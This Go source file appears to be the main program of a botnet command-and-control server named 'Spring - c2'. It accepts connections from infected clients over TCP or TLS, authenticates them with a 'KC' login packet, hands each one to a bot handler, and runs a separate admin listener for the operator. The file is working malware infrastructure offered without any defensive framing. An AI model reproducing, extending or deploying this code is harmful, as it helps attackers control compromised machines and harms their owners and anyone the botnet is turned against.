package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/Acey9/spring/common"
	"github.com/astaxie/beego/logs"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var clientList *ClientList = NewClientList()

var sp Spring

type Spring struct {
	Debug        bool
	settingsFile string
	settings     *SpringSettings
	logger       *logs.BeeLogger
}

func (h *Spring) sayHi() {
	fmt.Println("Spring - c2")
}

func (this *Spring) tlsListen() (err error) {
	cer, err := tls.LoadX509KeyPair(this.settings.ServerCrt, this.settings.ServerKey)
	if err != nil {
		fmt.Println(err)
		return
	}
	config := &tls.Config{Certificates: []tls.Certificate{cer}}

	//server, err := net.Listen("tcp", this.settings.Server)
	server, err := tls.Listen("tcp", this.settings.Server, config)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		conn, err := server.Accept()
		if err != nil {
			fmt.Println(err)
			break
		}
		go this.initHandler(conn)
	}
	return
}

func (this *Spring) netListen() (err error) {
	server, err := net.Listen("tcp", this.settings.Server)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		conn, err := server.Accept()
		if err != nil {
			fmt.Println(err)
			break
		}
		go this.initHandler(conn)
	}
	return
}

func (this *Spring) start() {

	admin, err := net.Listen("tcp", this.settings.AdminServer)
	if err != nil {
		fmt.Println(err)
		return
	}

	go func() {
		for {
			conn, err := admin.Accept()
			if err != nil {
				fmt.Println(err)
				break
			}
			go this.adminHandler(conn)
		}
	}()

	if this.settings.TLS {
		this.tlsListen()
	} else {
		this.netListen()
	}

	fmt.Println("Stopped accepting clients")
}

func (h *Spring) adminHandler(conn net.Conn) {
	defer conn.Close()
	NewAdmin(conn).Handle()
}

func (h *Spring) initHandler(conn net.Conn) {

	defer func() {
		if err := recover(); err != nil {
			msg := fmt.Sprintf("%s", err)
			sp.logger.Error(msg)
		}
		conn.Close()
	}()

	conn.SetDeadline(time.Now().Add(180 * time.Second))
	pkt, err := common.ReadPacket(conn)
	if err != nil {
		return
	}

	if pkt.Type == common.LOGIN {
		//&& pkt.Body == "1.0 KC" {
		loginInfo := strings.Split(string(pkt.Body), " ")
		if len(loginInfo) != 3 {
			return
		}

		if loginInfo[1] != "KC" {
			return
		}

		f, err := strconv.ParseFloat(loginInfo[0], 64)
		if err != nil {
			return
		}
		NewBot(conn, byte(f), loginInfo[2]).Handle()
	} else {
		//TODO
		sp.logger.Warn("login faield: %s", conn.RemoteAddr())
	}
}

func initSpring() {
	sp.settings = &SpringSettings{}
	err := NewSettings(sp.settingsFile, sp.settings)
	if err != nil {
		fmt.Printf("%s is not a valid toml config file\n", sp.settingsFile)
		fmt.Println(err)
		os.Exit(1)
	}
	initLogger()
}

func initLogger() {
	sp.logger = logs.NewLogger(10000)
	if sp.settings.Log.Stdout {
		sp.logger.SetLogger("console", "")
	}
	if sp.settings.Log.Path != "" {
		cfg := fmt.Sprintf(`{"filename":"%s"}`, sp.settings.Log.Path)
		sp.logger.SetLogger("file", cfg)
	}
	sp.logger.SetLevel(sp.settings.Log.BeeLevel())
	sp.logger.Async()
}

func optParse() {
	flag.StringVar(&sp.settingsFile, "c", "./spring.conf", "Look for config file in this directory")
	flag.BoolVar(&sp.Debug, "d", false, "Only debug")
	flag.Parse()
}

func init() {
	optParse()
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func main() {
	initSpring()
	sp.sayHi()
	sp.start()
}
